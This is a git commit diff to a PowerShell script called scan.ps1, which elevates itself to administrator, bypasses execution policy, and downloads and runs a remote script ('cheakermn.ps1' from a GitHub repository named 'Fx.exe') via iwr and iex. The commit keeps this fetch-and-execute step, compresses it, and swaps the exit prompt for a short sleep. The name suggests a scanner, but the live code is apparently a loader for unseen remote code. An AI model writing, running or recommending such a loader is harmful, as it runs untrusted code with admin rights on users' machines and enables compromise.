8fce42c684f8b27689860d8f15564d8aef7b6282
server <petrovolosuk310@gmail.com>
2026-03-20 12:14:29 +0200

    Update scan.ps1

--- scan.ps1
+++ scan.ps1
@@ -1,16 +1,12 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 
 if (-NOT $isAdmin) {
-    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    if ($args.Count -gt 0) {
-        $arguments += " " + ($args -join " ")
-    }
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"& '$PSCommandPath'`""
     Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
     exit
 }
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
-$script = (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
-iex $script
+iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
 
-Read-Host "Нажмите Enter для выхода"
+Start-Sleep -Seconds 5
